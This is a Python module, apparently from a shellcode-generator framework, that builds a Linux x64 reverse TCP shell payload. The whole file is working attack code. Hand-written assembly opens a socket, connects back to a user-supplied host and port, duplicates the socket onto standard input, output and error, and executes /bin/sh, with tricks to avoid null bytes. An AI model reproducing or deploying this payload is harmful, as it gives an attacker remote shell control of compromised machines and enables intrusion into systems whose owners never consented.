from shellcode.x86 import template


class payload_module(template.payload_module):

    def __init__(self, userinput):
        super().__init__()

        self.name = "Reverse TCP shell"
        self.description = "Used to create a template for "
        self.cli_name = "linux_rev_tcp"
        self.platform = "linux"
        self.arch = "x64"
        self.address = self.configure_socketaddr(userinput.lhost, userinput.lport)

        self.assembly = (
            "socket:                             "
            "   push byte 41                    ;"      # Push/pop will set syscall num
            "   pop rax                         ;"
            # cdq sets rdx to 0 if rax is positive
            "   cdq                             ;"
            "   push byte 2                     ;"      # AF_INET = 2
            "   pop rdi                         ;"
            "   push byte 1                     ;"      # SOCK_STREAM = 1
            "   pop rsi                         ;"
            # socket(AF_INET, SOCK_STREAM, 0)
            "   syscall                         ;"
            "connect:                           ;"
            # rdi is 2, so moving only al is doable
            "   xchg eax, edi                   ;"
            "   mov al, 42                      ;"
            "   mov rcx, " + self.address + ";" +    # Socket address and port
            "   neg rcx                         ;"
            "   push rcx                        ;"
            # mov rsi, rsp. This it the pointer to sockaddr
            "   push rsp                        ;"
            "   pop rsi                         ;"
            "   mov dl, 16                      ;"      # sockaddr length
            # connect(s, addr, len(addr))
            "   syscall                         ;"
            "dup2:                              ;"
            "   push byte 3                     ;"      # Start with 3 and decrement
            "   pop rsi                         ;"
            "dup2_loop:                          "      # Duplicate socket fd into stdin,
            # stdout and stderr, which fd are 0, 1 and 2
            # If there is no error, rax is 0 on connect and dup2
            "   mov al, 33                      ;"
            "   dec esi                         ;"
            "   syscall                         ;"      # dup2(s, rsi)
            "   jnz dup2_loop                   ;"      # Jump when esi == 0
            "execve:                             "
            "   cdq                             ;"
            "   mov al, 59                      ;"      # execve syscall is 59
            "   push rdx                        ;"      # Put null-byte in /bin//sh
            "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
            "   push rcx                        ;"
            # rsp points to the top of the stack, which is occupied by /bin/sh
            "   push rsp                        ;"
            # We use a push/pop to prevent null-byte and get a shorter shellcode
            "   pop rdi                         ;"
            # execve('/bin//sh', 0, 0)
            "   syscall                         ;"
        )

    def run(self):
        tawf = self.generate_shellcode(self.assembly)
        print(self.view_shellcode(tawf))
        
